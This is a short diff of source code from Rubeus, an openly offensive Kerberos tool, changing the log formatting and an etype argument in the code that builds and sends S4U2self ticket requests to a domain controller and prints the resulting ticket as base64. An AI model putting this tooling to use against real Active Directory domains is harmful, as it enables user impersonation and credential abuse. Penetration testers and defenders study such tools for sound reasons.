@@ -297,9 +297,9 @@ namespace Rubeus
             string dcIP = Networking.GetDCIP(domainController);
             if (String.IsNullOrEmpty(dcIP)) { return null; }
 
-            Console.WriteLine("[*] Building S4U2self request for: '{0}\\{1}'", domain, userName);
+            Console.WriteLine("[*] Building S4U2self request for: '{0}@{1}'", userName, domain);
 
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, false, targetUser);
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser);
 
             Console.WriteLine("[*] Sending S4U2self request");
             byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
@@ -375,7 +375,7 @@ namespace Rubeus
 
                 string kirbiString = Convert.ToBase64String(kirbiBytes);
 
-                Console.WriteLine("[*] Got a TGS for '{0}' to '{1}\\{2}'", info.pname.name_string[0], info.srealm, info.sname.name_string[0]);
+                Console.WriteLine("[*] Got a TGS for '{0}' to '{1}@{2}'", info.pname.name_string[0], info.sname.name_string[0], info.srealm);
                 Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
 
                 // display the .kirbi base64, columns of 80 chararacters
